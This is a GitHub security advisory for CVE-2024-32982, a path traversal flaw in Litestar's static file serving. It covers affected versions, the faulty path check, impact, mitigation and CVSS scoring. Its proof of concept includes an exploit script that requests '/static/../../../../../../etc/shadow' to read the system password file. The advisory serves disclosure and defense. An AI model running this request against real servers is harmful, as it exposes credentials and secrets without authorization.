[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fsecurity%2Fadvisories%2FGHSA-83pv-qr33-2vcf)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flitestar-org%2Flitestar%2Fsecurity%2Fadvisories%2FGHSA-83pv-qr33-2vcf)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Frepos%2Fadvisories%2Fshow&source=header-repo&source_repo=litestar-org%2Flitestar)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[litestar-org](/litestar-org)
/
**[litestar](/litestar-org/litestar)**
Public

* [Notifications](/login?return_to=%2Flitestar-org%2Flitestar) You must be signed in to change notification settings
* [Fork
  390](/login?return_to=%2Flitestar-org%2Flitestar)
* [Star
   5.8k](/login?return_to=%2Flitestar-org%2Flitestar)

* [Code](/litestar-org/litestar)
* [Issues
  178](/litestar-org/litestar/issues)
* [Pull requests
  15](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects
  3](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

Additional navigation options

* [Code](/litestar-org/litestar)
* [Issues](/litestar-org/litestar/issues)
* [Pull requests](/litestar-org/litestar/pulls)
* [Discussions](/litestar-org/litestar/discussions)
* [Actions](/litestar-org/litestar/actions)
* [Projects](/litestar-org/litestar/projects)
* [Security](/litestar-org/litestar/security)
* [Insights](/litestar-org/litestar/pulse)

# Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal') in Litestar and Starlite

High

[peterschutt](/peterschutt)
published
GHSA-83pv-qr33-2vcf
May 6, 2024

## Package

pip

litestar
([pip](/advisories?query=ecosystem%3Apip))

## Affected versions

>=2.0.0;<= 2.8.2

## Patched versions

2.8.3 2.7.2 2.6.4

pip

starlite
([pip](/advisories?query=ecosystem%3Apip))

>=1.37.0;<=1.51.15

1.51.16

## Description

# Summary

**Local File Inclusion via Path Traversal in LiteStar Static File Serving**

A Local File Inclusion (LFI) vulnerability has been discovered in the static file serving component of [LiteStar](https://github.com/litestar-org/litestar). This vulnerability allows attackers to exploit path traversal flaws, enabling unauthorized access to sensitive files outside the designated directories. Such access can lead to the disclosure of sensitive information or potentially compromise the server.

## Details

The vulnerability is located in the file path handling mechanism within the static content serving function, specifically at [line 70 in `litestar/static_files/base.py`](https://github.com/litestar-org/litestar/blob/main/litestar/static_files/base.py#L70).

The function fails to properly validate the destination file path derived from user input, thereby permitting directory traversal. The critical code segment is as follows:

```
commonpath([str(directory), file_info["name"], joined_path])
```

Given the variables:

```
directory = PosixPath('/Users/brian/sandbox/test_vuln/static')
file_info["name"] = '/Users/brian/sandbox/test_vuln/static/../requirements.txt'
joined_path = PosixPath('/Users/brian/sandbox/test_vuln/static/../requirements.txt')
```

The function outputs '/Users/brian/sandbox/test\_vuln/static', incorrectly assuming it is confined to the static directory. This incorrect validation facilitates directory traversal, exposing the system to potential unauthorized access and manipulation.

## Proof of Concept (PoC)

To reproduce this vulnerability, follow these steps:

1. **Set up the environment:**

   * Install with pip the `uvicorn` and `litestar` packages.
   * Create a `static` folder in the root directory of your project and place any file (e.g., an image) in it for testing.
   * Ensure the static file serving is enabled, which is typically the default configuration.
2. **Preparation of the testing environment:**

   * If using Ubuntu or a similar system, you can use `/etc/shadow` which contains sensitive password information. If not, create a dummy sensitive file outside the static directory for testing.
   * Create a `main.py` file with the following content to configure and run the LiteStar server:
   ```
   from pathlib import Path
   from litestar import Litestar
   from litestar.static_files import create_static_files_router
   import uvicorn

   app = Litestar(
       route_handlers=[
           create_static_files_router(path="/static", directories=["static"]),
       ],
   )

   if __name__ == "__main__":
       uvicorn.run("main:app", host="0.0.0.0", port=8000)
   ```
   * Run this script with the command `python3 main.py` to start the server.
3. **Exploit:**

   * Prepare an exploit script named `exploit.py` with the following Python code to perform the HTTP request without client-side sanitization:
   ```
   import http.client

   def send_request(host, port, path):
       connection = http.client.HTTPConnection(host, port)
       connection.request("GET", path)
       response = connection.getresponse()
       print(f"Status: {response.status}")
       print(f"Headers: {response.getheaders()}")
       data = response.read()
       print(f"Body: {data.decode('utf-8')}")
       connection.close()

   send_request("localhost", 8000, "/static/../../../../../../etc/shadow")
   ```
   * Execute this script using `python3 exploit.py`. This script uses direct HTTP connections to bypass client-side path sanitization present in tools like curl or web browsers.
4. **Observe:**

   * The server should respond with the contents of the `/etc/shadow` file, thereby confirming the path traversal vulnerability.
   * The output will display the status, headers, and body of the response, which should contain the contents of the sensitive file.

## Impact

This Local File Inclusion vulnerability critically affects all instances of [LiteStar](https://github.com/litestar-org/litestar) where the server has been configured to serve static files. By exploiting this vulnerability, unauthorized attackers can gain read access to any file that the server process has permission to access. Here are the specific impacts:

1. **Exposure of Sensitive Information:**

   * The ability to traverse the file system can lead to the exposure of highly sensitive information. This includes system configuration files, application logs, or scripts containing credentials or cryptographic keys. Such information can provide attackers with deeper insights into the system architecture or facilitate further attacks.
2. **Potential for System Compromise:**

   * If sensitive system or application configuration files are exposed, attackers might be able to use this information to manipulate system behavior or escalate their privileges. For instance, accessing a `.env` file might reveal environment variables used for application configurations that include database passwords or API keys.
3. **Credential Leakage:**

   * Access to files such as `/etc/passwd` or `/etc/shadow` (on Unix-like systems) could expose user credentials, which might be leveraged to perform further attacks, such as brute force attacks on user accounts or using stolen credentials to access other systems where the same credentials are reused.
4. **Regulatory and Compliance Violations:**

   * Unauthorized access to personally identifiable information (PII), payment data, or health records could result in breaches of data protection regulations such as GDPR, HIPAA, or PCI DSS. This could not only damage the reputation of the organization but also lead to heavy fines and legal action.
5. **Loss of Trust and Reputation Damage:**

   * Security incidents, particularly those involving the loss of sensitive data, can significantly damage an organization's reputation. Customers and partners may lose trust, which can impact the business both immediately and in the long term.
6. **Potential for Further Exploitation:**

   * The initial read access gained through this vulnerability might be used as a stepping stone for more severe attacks. For example, if application source code is accessed, it could be analyzed for further vulnerabilities that might lead to direct exploitation, such as remote code execution.

Here's the revised Mitigation Suggestion section for your vulnerability report, focusing on items 1 and 2, and including a reference to a similar implementation in another project:

## Mitigation Suggestion

To effectively address the Local File Inclusion vulnerability via path traversal identified in the [LiteStar](https://github.com/litestar-org/litestar) application, it is essential to implement robust input validation and sanitization mechanisms. Below are specific strategies focused on managing user inputs and ensuring secure file path handling:

1. **Input Validation and Sanitization:**

   * Implement rigorous validation of all user-supplied input, particularly file path inputs. This should include sanitizing the input to remove or neutralize potentially harmful characters and sequences such as `../` which are used in path traversal attacks.
   * Use regular expressions to validate file paths against a strict pattern that only matches expected and safe input.
2. **Path Normalization:**

   * Normalize file paths before using them in file operations. Functions such as `os.path.normpath()` in Python can be used to normalize paths. This method resolves redundant separators and up-level references (`../`) to prevent directory traversal.
   * As a reference, consider the approach taken by the Starlette framework in their static file serving feature, where path validation is performed to ensure the requested path remains within the intended directory. For example, see how Starlette handles this with a security check:
     ```
     if os.path.commonpath([full_path, directory]) != directory:
         # Don't allow misbehaving clients to break out of the static files
         # directory.
         continue
     ```

     This snippet from [Starlette's implementation](https://github.com/encode/starlette/blob/master/starlette/staticfiles.py#L166) ensures that the constructed file path does not traverse out of the specified directory.

## Comments

**Naming Convention:**

* From versions 0.X.X through 1.X.X, the package was released under the name "starlite."
* Starting with version 2.0.0 and for all subsequent versions, the package has been rebranded and released under the name "litestar."

**Feature Additions and Changes:**

* Static Files Support: Introduced in version 0.6.0, adding the capability to serve static files directly from the package.
* Path Validation Update: In version 1.37.0, Starlite modified its approach to validating paths within the static directory. Prior to this version, path validation was managed using the Starlette framework.

### Severity

High

8.2

# CVSS overall score

 This score calculates overall vulnerability severity from 0 to 10 and is based on the Common Vulnerability Scoring System (CVSS).

 / 10

#### CVSS v3 base metrics

Attack vector
Network

Attack complexity
Low

Privileges required
None

User interaction
None

Scope
Unchanged

Confidentiality
High

Integrity
Low

Availability
None

Learn more about base metrics

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.

CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N

### CVE ID

CVE-2024-32982

### Weaknesses

[CWE-22](/advisories?query=cwe%3A22)

### Credits

* [![@brian-edgar-re](https://avatars.githubusercontent.com/u/111369381?s=40&v=4)](/brian-edgar-re)
  [brian-edgar-re](/brian-edgar-re)
  Reporter

## Footer

Â© 2025 GitHub,Â Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You canât perform that action at this time.


